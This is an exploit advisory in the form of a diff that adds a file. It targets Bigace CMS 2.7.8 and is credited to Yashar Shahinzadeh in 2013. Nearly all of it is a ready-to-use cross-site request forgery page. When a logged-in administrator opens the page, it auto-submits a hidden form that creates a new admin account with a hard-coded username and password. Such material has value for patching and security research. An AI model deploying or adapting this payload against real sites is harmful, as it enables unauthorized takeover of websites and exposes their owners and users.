@@ -1,0 +1,34 @@
+###########################################################################################
+# Exploit Title: Bigace CMS CSRF - Adding  an admin account
+# Date: 2013 29 July
+# Exploit Author: Yashar shahinzadeh
+# Credit goes for: ha.cker.ir
+# Vendor Homepage: http://www.bigace.de/
+# Tested on: Linux & Windows, PHP 5.2.9
+# Affected Version : 2.7.8
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir }
+###########################################################################################
+
+Summary:
+========
+1. CSRF - Adding an admin account
+ 
+
+1. CSRF - Adding an admin account:
+==================================
+
+<html>
+<body onload="submitForm()">
+<form name="myForm" id="myForm"
+                action="[Path to Bigace CMS]/index.php?cmd=admin&id=userCreate_tADMIN_len&mode=create" method="post">
+                <input type="hidden" name="userName" value="yashar">
+                <input type="hidden" name="language" value="en">
+                <input type="hidden" name="userGroups[]" value="40">
+				<input type="hidden" name="state" value="1">
+				<input type="hidden" name="email" value="yashar@yashar.com">
+				<input type="hidden" name="passwordnew" value="yashar">
+				<input type="hidden" name="passwordcheck" value="yashar">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
